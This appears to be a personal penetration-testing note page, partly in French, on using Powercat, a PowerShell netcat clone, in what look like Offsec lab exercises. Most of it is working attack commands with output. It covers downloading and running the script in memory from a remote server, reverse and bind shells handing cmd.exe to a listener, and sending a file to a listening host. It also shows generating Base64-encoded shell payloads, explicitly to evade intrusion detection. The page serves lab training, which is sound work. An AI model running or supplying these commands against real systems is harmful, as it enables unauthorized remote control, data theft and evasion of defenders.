
# Powercat

#Tool/PowerCat

```bash
$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -O powercat.ps1
```


## Install

On kali, `powercat` can be installed with:

```bash
$ apt install powercat
```

and is located in `/usr/share/windows-resources/powercat/powercat.ps1`

It can be transfered to a windows box with [file transfers](../toolbox/file_transfers.md)

If the target machine is connected to the Internet, we can do the same with a remote script by once again using the handy `iex` cmdlet as follows:

```powershell
PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

## Usage

Load it first :

```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```

Then , test if it is known :

```powershell
PS C:\Users\offsec> powercat
```

You must select either client mode (`-c`) or listen mode (`-l`).

## netcat like

`netcat` en powershell :) https://github.com/besimorhino/powercat
```powershell
. .powercat.ps1
Powercat -c
```

## Powercat File Transfers
#FileTransfert/powercat

run a `netcat` listener :

```bash
sudo nc -lnvp 443 > receiving_powercat.ps1

listening on [any] 443 ...

connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661
```

Then send a file :

```powershell
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

## Powercat Reverse Shells

#Shell/Reverse/powercat

run a `netcat` listener :

```bash
sudo nc -lvp 443

listening on [any] 443 ...
```

Then on the windows box :

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

## Powercat Bind Shells

#Shell/Bind/powercat 

The listener :

```powershell
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

Then connect :

```bash
nc 10.11.0.22 443

Microsoft Windows [Version 10.0.17134.590]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```


## Powercat Stand-Alone Payloads

#Tool/powercat/Embedding

`powercat` can also generate stand-alone payloads. In the context of `powercat`, a payload is a set of powershell instructions as well as the portion of the `powercat` script itself that only includes the features requested by the user

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

PS C:\Users\offsec> ./reverseshell.ps1
```

It’s worth noting that stand-alone payloads like this one might be easily detected by IDS.

To overcome this problem, make use of PowerShell’s ability to execute Base64 encoded commands for encoding :

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

`-e` : encodage base64

Then execute it :

```powershell
PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAU........AAgACA
```

(copy/paste the content of file `encodedreverseshell.ps1`)

Then the listener :

```bash
sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725

PS C:\Users\offsec>
```


NB:

`-E` means -EncodedCommand. c'est un encodage Base64

Pour encoder :

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'Ma chaine de caracteres'"))
```

Pour décoder :

```powershell
[System.Text.Encoding]::Unicode.GetBytes([System.Convert]::FromBase64String('AAAAAAAA'))
```






## powercat

#Shell/Reverse/powercat 

```
$ cp /usr/share/windows-resources/powercat/powercat.ps1 .
$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
```

```
$ nc -nvlp 4444 
```

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.191:8080/powercat.ps1');powercat -c 192.168.119.191 -p 4444 -e cmd" 2>&1
```


